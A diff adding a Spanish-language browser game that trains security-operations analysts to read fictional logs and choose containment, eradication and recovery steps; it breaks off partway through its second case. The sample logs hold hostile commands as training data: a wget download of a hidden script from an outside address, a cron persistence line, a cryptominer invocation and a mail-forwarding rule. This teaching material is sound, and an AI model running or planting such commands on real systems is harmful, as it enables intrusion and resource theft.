@@ -1,0 +1,1029 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Turno SOC</title>
+<meta name="description" content="Juego de respuesta a incidentes: lees logs ficticios, marcas lo sospechoso y decides cómo contener, erradicar y recuperar.">
+<style>
+:root{
+  --bg:#f4f6fb; --panel:#ffffff; --panel2:#eef1f8; --text:#141a2a; --muted:#5b6478;
+  --line:#d7dce8; --accent:#0a7cff; --accent-ink:#ffffff; --ok:#11885a; --ok-bg:#e3f6ed;
+  --bad:#c8323c; --bad-bg:#fbe6e7; --warn:#b26a00; --warn-bg:#fff3dc;
+  --term:#0f1522; --term-text:#d6deeb; --term-muted:#7d8aa3; --term-sel:#2a3a5c;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --shadow:0 1px 2px rgba(20,26,42,.06),0 6px 20px rgba(20,26,42,.06);
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#0b0f17; --panel:#131a26; --panel2:#1a2333; --text:#e6ebf5; --muted:#93a0b8;
+    --line:#26324a; --accent:#3ddc97; --accent-ink:#06120c; --ok:#3ddc97; --ok-bg:#0f2a20;
+    --bad:#ff6b74; --bad-bg:#2c1418; --warn:#ffb547; --warn-bg:#2d2210;
+    --term:#070a10; --term-text:#d6deeb; --term-muted:#6b7890; --term-sel:#1d2b45;
+    --shadow:0 1px 2px rgba(0,0,0,.3),0 8px 24px rgba(0,0,0,.25);
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0b0f17; --panel:#131a26; --panel2:#1a2333; --text:#e6ebf5; --muted:#93a0b8;
+  --line:#26324a; --accent:#3ddc97; --accent-ink:#06120c; --ok:#3ddc97; --ok-bg:#0f2a20;
+  --bad:#ff6b74; --bad-bg:#2c1418; --warn:#ffb547; --warn-bg:#2d2210;
+  --term:#070a10; --term-text:#d6deeb; --term-muted:#6b7890; --term-sel:#1d2b45;
+  --shadow:0 1px 2px rgba(0,0,0,.3),0 8px 24px rgba(0,0,0,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0}
+body{background:var(--bg);color:var(--text);font:16px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh}
+.wrap{max-width:960px;margin:0 auto;padding:20px 16px 48px}
+header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:20px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:20px;letter-spacing:-.01em}
+.brand .logo{font-family:var(--mono);background:var(--accent);color:var(--accent-ink);border-radius:8px;padding:2px 8px;font-size:15px}
+.iconbtn{background:var(--panel);border:1px solid var(--line);color:var(--text);border-radius:8px;padding:6px 10px;cursor:pointer;font:inherit;font-size:14px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px;box-shadow:var(--shadow);margin-bottom:16px}
+h1{font-size:26px;margin:0 0 6px;letter-spacing:-.02em}
+h2{font-size:18px;margin:0 0 12px}
+h3{font-size:15px;margin:0 0 8px}
+p{margin:0 0 10px}
+.muted{color:var(--muted)}
+.small{font-size:14px}
+.tag{display:inline-block;font-size:12px;font-weight:700;letter-spacing:.03em;text-transform:uppercase;color:var(--accent);margin-bottom:4px}
+.actions{display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+.btn{font:inherit;font-weight:600;border-radius:10px;padding:10px 18px;cursor:pointer;border:1px solid var(--line);background:var(--panel2);color:var(--text)}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:var(--accent-ink)}
+.btn.sm{padding:6px 12px;font-size:14px}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+code{font-family:var(--mono);background:var(--panel2);padding:1px 5px;border-radius:5px;font-size:.92em}
+.hidden{display:none!important}
+.pop{animation:pop .35s ease}
+@keyframes pop{0%{transform:scale(.97);opacity:.6}100%{transform:scale(1);opacity:1}}
+.shake{animation:shake .35s ease}
+@keyframes shake{25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-3px)}}
+@media (prefers-reduced-motion: reduce){.pop,.shake{animation:none}}
+footer{text-align:center;font-size:13px;color:var(--muted);margin-top:24px}
+
+/* ciclo NIST */
+.cycle{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin:12px 0 4px}
+.cycle .st{background:var(--panel2);border:1px solid var(--line);border-radius:999px;padding:4px 12px;font-size:14px;font-weight:600}
+.cycle .ar{color:var(--muted)}
+.cycle .st.here{border-color:var(--accent);color:var(--accent)}
+.cycle .st.done{background:var(--ok-bg);border-color:transparent;color:var(--ok)}
+
+/* casos */
+.levels{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin-top:16px}
+.level{text-align:left;background:var(--panel2);border:1px solid var(--line);border-radius:12px;padding:14px;cursor:pointer;color:var(--text);font:inherit;transition:transform .1s,border-color .1s;display:flex;flex-direction:column}
+.level:hover:not(:disabled){border-color:var(--accent);transform:translateY(-1px)}
+.level:disabled{opacity:.5;cursor:not-allowed}
+.level .num{font-family:var(--mono);font-size:12px;color:var(--muted);display:flex;justify-content:space-between;gap:8px}
+.level .name{font-weight:700;margin:2px 0 2px}
+.level .co{font-size:14px;color:var(--muted);margin-bottom:6px}
+.level .best{font-size:13px;margin-top:auto;padding-top:8px;font-family:var(--mono)}
+.sev{font-family:var(--mono);font-size:11px;font-weight:700;border-radius:6px;padding:1px 6px;text-transform:uppercase;letter-spacing:.04em}
+.sev.media{background:var(--warn-bg);color:var(--warn)}
+.sev.alta,.sev.critica{background:var(--bad-bg);color:var(--bad)}
+
+/* HUD */
+.hud{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px;align-items:center}
+.pill{background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:4px 12px;font-size:14px;font-family:var(--mono);white-space:nowrap}
+.pill b{font-weight:700}
+.impact{flex:1 1 200px;display:flex;align-items:center;gap:8px;background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:4px 12px;font-size:14px;font-family:var(--mono)}
+.impact .bar{flex:1;height:8px;background:var(--panel2);border-radius:99px;overflow:hidden;min-width:60px}
+.impact .fill{height:100%;background:var(--ok);border-radius:99px;transition:width .4s,background .4s}
+
+/* ticket */
+.ticket{display:flex;gap:14px;align-items:flex-start}
+.ticket .ico{font-size:30px;line-height:1}
+.ticket .meta{font-family:var(--mono);font-size:13px;color:var(--muted);margin-bottom:4px;display:flex;flex-wrap:wrap;gap:6px 12px;align-items:center}
+
+/* consola de logs */
+.term{background:var(--term);color:var(--term-text);border-radius:12px;overflow:hidden;border:1px solid var(--line)}
+.term-bar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:space-between;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.08);font-family:var(--mono);font-size:13px;color:var(--term-muted)}
+.term-bar .dots{display:flex;gap:6px;align-items:center}
+.term-bar .dots i{width:10px;height:10px;border-radius:50%;background:#ff5f57;display:inline-block}
+.term-bar .dots i:nth-child(2){background:#febc2e}.term-bar .dots i:nth-child(3){background:#28c840}
+.grep{display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.06);border-radius:8px;padding:3px 8px}
+.grep input{background:transparent;border:0;outline:0;color:var(--term-text);font:13px var(--mono);width:150px}
+.grep input::placeholder{color:var(--term-muted)}
+.logs{max-height:420px;overflow:auto;padding:6px 0;font:13px/1.55 var(--mono)}
+.ln{display:flex;gap:10px;padding:2px 12px 2px 0;cursor:pointer;border-left:3px solid transparent;white-space:pre-wrap;word-break:break-all}
+.ln:hover{background:rgba(255,255,255,.05)}
+.ln .no{color:var(--term-muted);min-width:34px;text-align:right;user-select:none;flex:none}
+.ln.sel{background:var(--term-sel);border-left-color:#ffb547}
+.ln.read{cursor:default}
+.ln.hit{background:rgba(61,220,151,.14);border-left-color:#3ddc97}
+.ln.miss{background:rgba(255,181,71,.13);border-left-color:#ffb547}
+.ln.fp{background:rgba(255,107,116,.14);border-left-color:#ff6b74}
+.ln .why{display:block;color:#ffcf85;font-family:system-ui,sans-serif;font-size:13px;margin-top:2px}
+.ln.hit .why{color:#8ff0c2}
+.ln mark{background:#ffb547;color:#111;border-radius:2px}
+.term-foot{padding:8px 12px;border-top:1px solid rgba(255,255,255,.08);font-family:var(--mono);font-size:12px;color:var(--term-muted);display:flex;gap:14px;flex-wrap:wrap}
+.legend span::before{content:"";display:inline-block;width:10px;height:10px;border-radius:2px;margin-right:5px;vertical-align:-1px}
+.legend .l-hit::before{background:#3ddc97}.legend .l-miss::before{background:#ffb547}.legend .l-fp::before{background:#ff6b74}
+
+/* decisiones */
+.opts{display:grid;gap:10px;margin-top:12px}
+.opt{text-align:left;background:var(--panel2);border:1px solid var(--line);border-radius:12px;padding:12px 14px;cursor:pointer;color:var(--text);font:inherit;display:flex;gap:12px;align-items:flex-start}
+.opt:hover:not(:disabled){border-color:var(--accent)}
+.opt:disabled{cursor:default}
+.opt .k{font-family:var(--mono);font-weight:700;color:var(--muted);flex:none;width:22px}
+.opt .body{flex:1}
+.opt .ex{display:block;font-size:14px;margin-top:6px;color:var(--muted)}
+.opt .res{font-family:var(--mono);font-size:12px;font-weight:700;flex:none;white-space:nowrap}
+.opt.best{border-color:var(--ok);background:var(--ok-bg)}
+.opt.best .res{color:var(--ok)}
+.opt.partial{border-color:var(--warn)}
+.opt.partial .res{color:var(--warn)}
+.opt.wrong .res{color:var(--bad)}
+.opt.chosen{box-shadow:0 0 0 2px var(--accent)}
+.opt.chosen.wrong{border-color:var(--bad);background:var(--bad-bg)}
+.feedback{margin-top:14px;padding:12px 14px;border-radius:10px;font-weight:600}
+.feedback.ok{background:var(--ok-bg);color:var(--ok)}
+.feedback.bad{background:var(--bad-bg);color:var(--bad)}
+.feedback.mid{background:var(--warn-bg);color:var(--warn)}
+.hint{margin-top:12px;padding:10px 14px;border-left:3px solid var(--warn);background:var(--panel2);border-radius:6px;font-size:15px}
+
+/* informe */
+.big{font-size:44px;font-weight:800;font-family:var(--mono);letter-spacing:-.02em;margin:4px 0}
+.stars{font-size:32px;letter-spacing:4px;color:var(--warn)}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin:14px 0}
+.stat{background:var(--panel2);border-radius:10px;padding:10px 12px}
+.stat .v{font-family:var(--mono);font-size:22px;font-weight:700}
+.stat .l{font-size:13px;color:var(--muted)}
+.timeline{list-style:none;margin:8px 0 0;padding:0;border-left:2px solid var(--line)}
+.timeline li{position:relative;padding:0 0 14px 18px}
+.timeline li::before{content:"";position:absolute;left:-7px;top:5px;width:12px;height:12px;border-radius:50%;background:var(--panel);border:2px solid var(--muted)}
+.timeline li.g::before{border-color:var(--ok);background:var(--ok)}
+.timeline li.m::before{border-color:var(--warn);background:var(--warn)}
+.timeline li.b::before{border-color:var(--bad);background:var(--bad)}
+.timeline .when{font-family:var(--mono);font-size:13px;color:var(--muted)}
+.timeline .what{font-weight:600}
+.timeline .pts{font-family:var(--mono);font-size:13px}
+.lesson{background:var(--panel2);border-radius:10px;padding:12px 14px;border-left:3px solid var(--accent)}
+.toast{position:fixed;left:50%;bottom:20px;transform:translateX(-50%);background:var(--text);color:var(--bg);padding:8px 16px;border-radius:999px;font-size:14px;font-weight:600;z-index:9}
+
+@media (max-width:560px){
+  .big{font-size:36px}
+  .logs{font-size:12px}
+  .grep input{width:110px}
+  .ticket .ico{display:none}
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <a href="../../index.html" style="display:inline-block;margin:0 0 10px;font-size:14px;color:var(--muted);text-decoration:none">&larr; Volver al portafolio</a>
+  <header>
+    <div class="brand"><span class="logo">SOC</span> Turno SOC</div>
+    <div style="display:flex;gap:8px">
+      <button class="iconbtn hidden" id="btnMenu" type="button">Menú</button>
+      <button class="iconbtn" id="btnTheme" type="button" aria-label="Cambiar tema">Tema</button>
+    </div>
+  </header>
+
+  <!-- MENÚ -->
+  <section id="scrMenu">
+    <div class="card">
+      <span class="tag">Respuesta a incidentes</span>
+      <h1>Te toca el turno en el SOC</h1>
+      <p>Eres analista de un centro de operaciones de seguridad que atiende a cinco empresas. Cada caso empieza con una alerta: lees los logs, marcas las líneas sospechosas y decides qué hacer en cada fase. Cada decisión mueve el reloj y el impacto del incidente.</p>
+      <div class="cycle" aria-label="Fases del juego">
+        <span class="st">1 · Detección</span><span class="ar">→</span>
+        <span class="st">2 · Contención</span><span class="ar">→</span>
+        <span class="st">3 · Erradicación</span><span class="ar">→</span>
+        <span class="st">4 · Recuperación</span>
+      </div>
+      <details>
+        <summary>¿De dónde salen estas fases?</summary>
+        <p class="small" style="margin-top:8px">Vienen del ciclo de respuesta a incidentes del NIST (guía SP 800-61): preparación, detección y análisis, contención, erradicación y recuperación, y lecciones aprendidas. La preparación es todo lo que hiciste antes (respaldos, logs, MFA) y las lecciones aprendidas te las da el informe al final de cada caso.</p>
+        <ul class="small">
+          <li><b>Contener</b> es frenar el daño ahora, aunque no hayas arreglado la causa.</li>
+          <li><b>Erradicar</b> es sacar al atacante y todo lo que dejó: malware, cuentas, tareas programadas, la vulnerabilidad.</li>
+          <li><b>Recuperar</b> es volver a operar con seguridad y vigilar que no regrese.</li>
+        </ul>
+      </details>
+    </div>
+    <div class="card">
+      <h2>Casos del turno</h2>
+      <p class="muted small">Se desbloquean en orden. Tu mejor resultado queda guardado en este navegador.</p>
+      <div class="levels" id="levels"></div>
+      <div class="actions" style="margin-top:14px">
+        <button class="btn sm" id="btnReset" type="button">Borrar progreso</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- JUEGO -->
+  <section id="scrGame" class="hidden">
+    <div class="hud">
+      <span class="pill" id="hudCase">Caso 1/5</span>
+      <span class="pill">Puntaje <b id="hudScore">0</b></span>
+      <span class="pill">🕒 <b id="hudClock">00:00</b></span>
+      <span class="impact" title="Impacto del incidente en la empresa">Impacto <span class="bar"><span class="fill" id="hudFill"></span></span><b id="hudImpact">0%</b></span>
+    </div>
+    <div class="cycle" id="phaseBar" style="margin:0 0 14px"></div>
+
+    <div class="card">
+      <div class="ticket">
+        <div class="ico" id="tkIco">🚨</div>
+        <div>
+          <div class="meta"><span id="tkId"></span><span class="sev" id="tkSev"></span><span id="tkCo"></span></div>
+          <h2 id="tkTitle" style="margin-bottom:6px"></h2>
+          <p id="tkBrief" class="small" style="margin:0"></p>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" id="logCard">
+      <div class="term">
+        <div class="term-bar">
+          <span class="dots"><i></i><i></i><i></i> <span id="logSrc" style="margin-left:6px"></span></span>
+          <label class="grep">grep <input id="grep" type="text" placeholder="filtrar líneas…" autocomplete="off" spellcheck="false"></label>
+        </div>
+        <div class="logs" id="logs"></div>
+        <div class="term-foot" id="termFoot"></div>
+      </div>
+    </div>
+
+    <div class="card" id="qCard">
+      <span class="tag" id="qPhase"></span>
+      <h2 id="qTitle"></h2>
+      <p id="qText" class="small muted"></p>
+      <div id="qBody"></div>
+      <div id="qFeedback"></div>
+      <div class="actions" style="margin-top:14px" id="qActions"></div>
+    </div>
+  </section>
+
+  <!-- INFORME -->
+  <section id="scrReport" class="hidden">
+    <div class="card pop" style="text-align:center">
+      <span class="tag">Informe del incidente</span>
+      <h1 id="rpTitle"></h1>
+      <p class="muted" id="rpCo"></p>
+      <div class="stars" id="rpStars"></div>
+      <div class="big" id="rpScore"></div>
+      <p id="rpVerdict" style="font-weight:600"></p>
+    </div>
+    <div class="card">
+      <div class="stats" id="rpStats"></div>
+      <h2>Línea de tiempo</h2>
+      <ul class="timeline" id="rpTimeline"></ul>
+    </div>
+    <div class="card">
+      <h2>Lección aprendida</h2>
+      <div class="lesson" id="rpLesson"></div>
+      <div class="actions" style="margin-top:16px">
+        <button class="btn primary" id="btnNext" type="button">Siguiente caso</button>
+        <button class="btn" id="btnRetry" type="button">Repetir caso</button>
+        <button class="btn" id="btnCopy" type="button">Copiar informe</button>
+        <button class="btn" id="btnBack" type="button">Volver al menú</button>
+      </div>
+    </div>
+  </section>
+
+  <footer>Hecho para estudiar redes y ciberseguridad · empresas, personas, dominios e IP inventados (rangos de documentación) · todo corre en tu navegador</footer>
+</div>
+
+<script>
+(() => {
+'use strict';
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+
+/* ---------- progreso guardado ---------- */
+const KEY = 'turno-soc-v1';
+let save = { unlocked: 1, best: {} };
+try { const s = JSON.parse(localStorage.getItem(KEY)); if (s && s.unlocked) save = Object.assign(save, s); } catch (e) {}
+const persist = () => { try { localStorage.setItem(KEY, JSON.stringify(save)); } catch (e) {} };
+
+/* ---------- tema ---------- */
+const root = document.documentElement;
+try { const t = localStorage.getItem(KEY + '-theme'); if (t) root.dataset.theme = t; } catch (e) {}
+$('btnTheme').onclick = () => {
+  const dark = root.dataset.theme ? root.dataset.theme === 'dark' : matchMedia('(prefers-color-scheme: dark)').matches;
+  root.dataset.theme = dark ? 'light' : 'dark';
+  try { localStorage.setItem(KEY + '-theme', root.dataset.theme); } catch (e) {}
+};
+
+/* ---------- casos ----------
+   logs: [texto, explicación]  → si trae explicación, la línea es sospechosa
+   opciones: { t: texto, s: puntos (0-20), imp: cambio de impacto, min: minutos, why: explicación } */
+const CASES = [
+{
+  id: 'ssh', ico: '🔐', title: 'Madrugada en la caja', company: 'Panadería Los Aromos', sector: 'Comercio · 3 locales',
+  ticket: 'INC-0412', sev: 'media', start: '07:45', impact: 10,
+  brief: 'El servidor de las cajas (pos-srv01, 192.168.10.5) anda lento desde la madrugada y el ventilador suena a tope. El encargado te manda el auth.log del servidor. La única cuenta que entra por SSH a diario es admin, desde el PC de la oficina (192.168.10.20).',
+  src: 'pos-srv01:/var/log/auth.log',
+  hint: 'Busca muchos intentos fallidos seguidos desde una misma IP de internet y fíjate qué pasa justo después. Prueba filtrar con grep "203.0".',
+  logs: [
+    ['Oct  8 02:10:11 pos-srv01 sshd[1201]: Accepted publickey for admin from 192.168.10.20 port 51522 ssh2', ''],
+    ['Oct  8 02:14:03 pos-srv01 CRON[1240]: pam_unix(cron:session): session opened for user root by (uid=0)', ''],
+    ['Oct  8 02:31:47 pos-srv01 sshd[1302]: Failed password for invalid user oracle from 203.0.113.45 port 40112 ssh2', 'Intento con un usuario que no existe (oracle) desde una IP externa: típico de diccionarios de fuerza bruta.'],
+    ['Oct  8 02:31:49 pos-srv01 sshd[1302]: Failed password for invalid user test from 203.0.113.45 port 40112 ssh2', 'Misma IP, otro usuario de diccionario, dos segundos después. Ningún humano escribe tan rápido.'],
+    ['Oct  8 02:31:52 pos-srv01 sshd[1305]: Failed password for root from 203.0.113.45 port 40130 ssh2', 'Intento contra root desde internet.'],
+    ['Oct  8 02:31:54 pos-srv01 sshd[1305]: Failed password for deploy from 203.0.113.45 port 40130 ssh2', 'Ahora apunta a deploy, una cuenta que sí existe.'],
+    ['Oct  8 02:32:01 pos-srv01 sshd[1305]: Failed password for deploy from 203.0.113.45 port 40130 ssh2', 'Sigue probando contraseñas para deploy.'],
+    ['Oct  8 02:32:03 pos-srv01 sshd[1305]: Disconnecting authenticating user deploy 203.0.113.45 port 40130: Too many authentication failures', 'SSH corta la conexión por exceso de fallos, pero el atacante puede reconectar.'],
+    ['Oct  8 02:35:40 pos-srv01 systemd[1]: Started Daily apt download activities.', ''],
+    ['Oct  8 02:40:18 pos-srv01 sshd[1388]: Failed password for deploy from 203.0.113.45 port 40377 ssh2', 'Vuelve a intentar con deploy.'],
+    ['Oct  8 02:40:22 pos-srv01 sshd[1388]: Accepted password for deploy from 203.0.113.45 port 40377 ssh2', 'La línea clave: después de tantos fallos, la contraseña funcionó. El atacante está dentro.'],
+    ['Oct  8 02:40:22 pos-srv01 sshd[1388]: pam_unix(sshd:session): session opened for user deploy by (uid=0)', 'Se abre la sesión del atacante como deploy.'],
+    ['Oct  8 02:41:05 pos-srv01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/x.sh -O /tmp/.x.sh', 'Usa sudo para bajar un script desde otra IP externa a un archivo oculto en /tmp.'],
+    ['Oct  8 02:41:30 pos-srv01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e', 'Edita el crontab de root: muy probablemente para dejar persistencia.'],
+    ['Oct  8 03:00:01 pos-srv01 CRON[1460]: pam_unix(cron:session): session opened for user root by (uid=0)', ''],
+    ['Oct  8 07:58:10 pos-srv01 sshd[2011]: Failed password for maria from 192.168.10.31 port 50211 ssh2', ''],
+    ['Oct  8 07:58:16 pos-srv01 sshd[2011]: Accepted password for maria from 192.168.10.31 port 50211 ssh2', ''],
+  ],
+  fpNote: 'Ojo: el fallo de maria desde la red interna seguido de un acceso correcto seis segundos después es alguien que se equivocó al escribir.',
+  classify: {
+    q: '¿Qué está pasando en pos-srv01?',
+    opts: [
+      { t: 'Fuerza bruta por SSH que terminó en acceso exitoso, con descarga de un script y persistencia.', s: 20, imp: 0, min: 6, why: 'Exacto. Muchos fallos desde 203.0.113.45, un acceso correcto como deploy, y luego wget + crontab con sudo.' },
+      { t: 'Un escaneo de puertos desde internet, sin acceso.', s: 5, imp: 5, min: 12, why: 'Hubo más que un escaneo: la línea "Accepted password for deploy from 203.0.113.45" muestra que entró.' },
+      { t: 'Un ataque de denegación de servicio (DDoS) que tiene lento el servidor.', s: 0, imp: 10, min: 20, why: 'Un DDoS se vería como miles de conexiones de muchas IP, no como inicios de sesión. La lentitud probablemente viene del script.' },
+      { t: 'Una tarea cron mal configurada por el encargado.', s: 0, imp: 10, min: 20, why: 'Las tareas cron de las 02:14 y 03:00 son normales. Lo raro es quién editó el crontab a las 02:41.' },
+    ],
+  },
+  steps: [
+    {
+      phase: 'Contención',
+      q: 'La sesión de deploy sigue abierta. ¿Qué haces primero?',
+      opts: [
+        { t: 'Bloquear 203.0.113.45 y 198.51.100.23 en el firewall, cerrar la sesión de deploy y bloquear esa cuenta.', s: 20, imp: -5, min: 10, why: 'Cortas el acceso del atacante y su servidor de descarga sin apagar el negocio. El servidor sigue encendido para analizarlo.' },
+        { t: 'Apagar el servidor de inmediato.', s: 8, imp: 5, min: 25, why: 'Detiene el ataque, pero las cajas quedan fuera de servicio y pierdes evidencia en memoria (procesos y conexiones activas).' },
+        { t: 'Cambiar la contraseña de deploy y nada más.', s: 5, imp: 10, min: 15, why: 'La sesión que ya está abierta no se cierra al cambiar la contraseña, y el crontab sigue ahí.' },
+        { t: 'Dejar que siga un rato para ver qué más hace.', s: 0, imp: 20, min: 45, why: 'Observar a un atacante es una técnica avanzada que se hace en entornos controlados. En un servidor de producción solo le das más tiempo.' },
+      ],
+    },
+    {
+      phase: 'Erradicación',
+      q: 'Revisaste el servidor y encontraste esto. ¿Qué incluye la erradicación?',
+      extra: { src: 'pos-srv01 · revisión manual', lines: [
+        '$ sudo crontab -l',
+        '*/5 * * * * /tmp/.x.sh >/dev/null 2>&1',
+        '$ cat /home/deploy/.ssh/authorized_keys',
+        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq7...Xk2 x@vps-203',
+        '$ ps aux --sort=-%cpu | head -2',
+        'USER   PID  %CPU COMMAND',
+        'root  1477  97.3 /tmp/.x.sh --pool 198.51.100.23:3333 --name kworkerd',
+      ] },
+      opts: [
+        { t: 'Matar el proceso, borrar /tmp/.x.sh, quitar la línea del crontab y la llave SSH desconocida, y revisar las demás cuentas.', s: 20, imp: -10, min: 15, why: 'Sacas el minero de criptomonedas y las dos puertas traseras (cron y llave SSH). Revisar otras cuentas evita que quede algo más.' },
+        { t: 'Reinstalar el servidor desde cero y restaurar la configuración.', s: 14, imp: -10, min: 60, why: 'Es la opción más segura cuando no sabes qué tan profundo llegó, pero toma más tiempo con las cajas detenidas.' },
+        { t: 'Borrar /tmp/.x.sh y listo.', s: 5, imp: 10, min: 8, why: 'La llave SSH del atacante sigue en authorized_keys: puede volver a entrar sin contraseña cuando quiera.' },
+        { t: 'Reiniciar el servidor.', s: 0, imp: 15, min: 10, why: 'El cron vuelve a lanzar el script cada 5 minutos. Reiniciar no erradica nada.' },
+      ],
+    },
+    {
+      phase: 'Recuperación',
+      q: '¿Cómo vuelves a dejar operando el servidor?',
+      opts: [
+        { t: 'Deshabilitar el login por contraseña en SSH (solo llaves), limitar SSH a la red interna o VPN, poner fail2ban y vigilar el auth.log unos días.', s: 20, imp: -10, min: 20, why: 'Atacas la causa: la contraseña débil expuesta a internet. Sin login por contraseña, la fuerza bruta deja de servir.' },
+        { t: 'Reactivar deploy con una contraseña más larga.', s: 8, imp: 0, min: 5, why: 'Ayuda, pero SSH sigue expuesto a internet aceptando contraseñas. Es cuestión de tiempo.' },
+        { t: 'Cerrar SSH para siempre.', s: 5, imp: 0, min: 5, why: 'Nadie podrá administrar el servidor. La seguridad también tiene que dejar trabajar.' },
+        { t: 'Dejar todo como estaba, ya se limpió.', s: 0, imp: 15, min: 0, why: 'El mismo bot va a volver a probar la misma contraseña débil esta noche.' },
+      ],
+    },
+  ],
+  lesson: 'Un servicio SSH expuesto a internet con contraseñas es blanco seguro de bots de fuerza bruta. El patrón en el log es claro: muchos "Failed password" desde una IP y luego un "Accepted". Usa llaves en lugar de contraseñas, limita el acceso por IP o VPN y revisa cron y authorized_keys, que son los lugares favoritos para dejar persistencia.',
+},
+{
+  id: 'bec', ico: '📧', title: 'La factura que no era', company: 'Transportes Cordillera', sector: 'Logística · 120 personas',
+  ticket: 'INC-0419', sev: 'alta', start: '11:20', impact: 15,
+  brief: 'Varias personas preguntan a soporte por un correo "Factura pendiente #8841" que les llegó desde la cuenta de Laura Sepúlveda (lsepulveda), de Pagos. Ella dice que no lo envió. Tienes los logs combinados del gateway de correo, el proxy web y los inicios de sesión.',
+  src: 'siem · correo + proxy + auth · 2026-10-08',
+  hint: 'Mira con lupa el dominio del remitente de la factura (¿es una l o una I mayúscula?) y busca inicios de sesión de lsepulveda desde lugares raros. Prueba grep "lsepulveda".',
+  logs: [
+    ['08:02:14 AUTH    user=lsepulveda ip=192.168.40.18 geo=CL result=success agent="Mozilla/5.0 (Windows NT 10.0)"', ''],
+    ['09:12:44 MAIL    from=<facturas@cordiIlera-transportes.example> to=<pagos@cordillera-transportes.example> subj="Factura pendiente #8841" spf=fail dkim=none action=deliver', 'Dominio parecido con una I mayúscula en vez de l, y SPF falló. Es el correo de phishing.'],
+    ['09:13:02 MAIL    from=<rrhh@cordillera-transportes.example> to=<todos@cordillera-transportes.example> subj="Turnos de octubre" spf=pass dkim=pass action=deliver', ''],
+    ['09:20:15 PROXY   user=lsepulveda GET http://cordillera-login.example/owa/?f=8841 200', 'Laura hizo clic: abre una página que imita el login del correo en un dominio que no es de la empresa.'],
+    ['09:20:51 PROXY   user=lsepulveda POST http://cordillera-login.example/auth 302', 'Envía un formulario (POST) a la página falsa: ahí entregó su usuario y contraseña.'],
+    ['09:45:30 PROXY   user=jmunoz GET https://intranet.cordillera-transportes.example/turnos 200', ''],
+    ['10:05:33 AUTH    user=lsepulveda ip=198.51.100.140 geo=NL result=success agent="python-requests/2.31"', 'Inicio de sesión exitoso desde Países Bajos con un script de Python, 45 minutos después del robo. No es Laura.'],
+    ['10:06:02 MAILBOX user=lsepulveda op=New-InboxRule name="." forwardTo=archivo.seguro@correo-externo.example deleteAfter=true', 'Crea una regla que reenvía todo a un correo externo y borra el original. Clásico de cuentas tomadas.'],
+    ['10:07:40 MAILBOX user=lsepulveda op=Send rcpt=45 subj="Factura pendiente #8841"', 'Usa la cuenta de Laura para mandar la misma factura falsa a 45 personas: ahora viene de alguien de confianza.'],
+    ['10:15:09 AUTH    user=jmunoz ip=192.168.40.22 geo=CL result=fail reason=bad_password', ''],
+    ['10:15:20 AUTH    user=jmunoz ip=192.168.40.22 geo=CL result=success', ''],
+    ['10:42:57 MAIL    from=<ventas@proveedor-neumaticos.example> to=<compras@cordillera-transportes.example> subj="Cotización octubre" spf=pass dkim=pass action=deliver', ''],
+  ],
+  fpNote: 'El fallo y acceso de jmunoz es desde la oficina y seguido, como un error al tipear. El correo de RR. HH. pasa SPF y DKIM.',
+  classify: {
+    q: '¿Cómo clasificas el incidente?',
+    opts: [
+      { t: 'Phishing con robo de credenciales y toma de la cuenta de correo (account takeover).', s: 20, imp: 0, min: 6, why: 'Correcto: correo suplantado, clic, POST con las credenciales, login desde otro país, regla de reenvío y envío masivo.' },
+      { t: 'Malware en el PC de Laura que envía correos solo.', s: 5, imp: 5, min: 15, why: 'Los correos salieron desde una sesión iniciada en 198.51.100.140, no desde su PC. Le robaron la contraseña, no el equipo.' },
+      { t: 'Spam común que se coló por el filtro.', s: 0, imp: 10, min: 20, why: 'El spam no inicia sesión en tu cuenta ni crea reglas de reenvío. Esto es un compromiso de cuenta.' },
+      { t: 'Una falla del filtro antispam y nada más.', s: 3, imp: 10, min: 15, why: 'El filtro dejó pasar un correo con SPF fallido, pero el problema grave es lo que pasó después con la cuenta.' },
+    ],
+  },
+  steps: [
+    {
+      phase: 'Contención',
+      q: 'El atacante sigue con acceso al buzón. ¿Qué haces?',
+      opts: [
+        { t: 'Restablecer la contraseña de lsepulveda, cerrar todas sus sesiones y tokens activos, y bloquear 198.51.100.140.', s: 20, imp: -5, min: 10, why: 'Cambiar la clave no basta si las sesiones abiertas siguen válidas. Revocarlas saca al atacante de inmediato.' },
+        { t: 'Solo cambiar la contraseña.', s: 8, imp: 10, min: 5, why: 'Las sesiones y tokens ya emitidos pueden seguir funcionando un buen rato después del cambio.' },
